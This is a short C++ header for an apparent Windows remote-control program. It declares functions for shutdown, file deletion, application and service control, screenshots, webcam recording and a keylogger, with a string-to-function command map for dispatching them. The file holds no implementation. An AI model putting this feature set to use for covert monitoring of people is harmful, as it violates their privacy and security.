#pragma once

// #define _WIN32_WINNT 0x0A00
#include <Windows.h>
#include <string>
#include <map>

#include "ApplicationManager.h"
#include "CatureOperator.h"
#include "SystemManager.h"
#include "KeyLogger.h"

namespace Services {
    bool shutdown(const std::string &saveFile);
    bool restart(const std::string &saveFile);
    bool deleteFile(const std::string &filePath);

    bool listApplications(const std::string &saveFile);
    bool startApplication(const std::string &appName);
    bool stopApplication(const std::string &appName);

    bool listServices(const std::string &saveFile);
    bool startService(const std::string &serviceName);
    bool stopService(const std::string &serviceName);

    bool screenShot(const std::string &saveFile);
    bool webcamRecord(const std::string &fileName);

    bool keyLogger(const std::string &saveFile);
    
    extern std::map<std::string, bool(*)(const std::string&)> servicesMap;
}